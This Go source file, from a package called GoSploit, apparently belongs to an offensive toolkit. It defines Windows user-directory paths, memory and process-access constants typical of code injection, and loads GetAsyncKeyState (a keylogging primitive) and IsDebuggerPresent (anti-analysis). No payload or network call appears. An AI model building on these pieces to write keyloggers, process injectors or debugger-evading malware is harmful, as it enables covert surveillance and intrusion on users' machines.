package GoSploit

import (
	"os"
	"syscall"
)

var username string = os.Getenv("username")
var HomeDir string = `C:\Users\` + username + "\\"
var DekstopDir string = HomeDir + "\\Desktop\\"
var AppDataRoaming string = HomeDir + "\\AppData\\Roaming\\"
var AppDataLocal string = HomeDir + "\\AppData\\Local\\"
var AppDataLocalLow string = HomeDir + "\\AppData\\LocalLow\\"
var TempDir string = AppDataLocal + "Temp\\"

const MEM_COMMIT = 0x1000
const MEM_RESERVE = 0x2000
const PAGE_EXECUTE_READWRITE = 0x40
const PROCESS_CREATE_THREAD = 0x0002
const PROCESS_QUERY_INFORMATION = 0x0400
const PROCESS_VM_OPERATION = 0x0008
const PROCESS_VM_WRITE = 0x0020
const PROCESS_VM_READ = 0x0010

var K32 = syscall.MustLoadDLL("kernel32.dll")  //kernel32.dll
var USER32 = syscall.MustLoadDLL("user32.dll") //user32.dll
var GetAsyncKeyState = USER32.MustFindProc("GetAsyncKeyState")
var IsDebuggerPresent = K32.MustFindProc("IsDebuggerPresent")
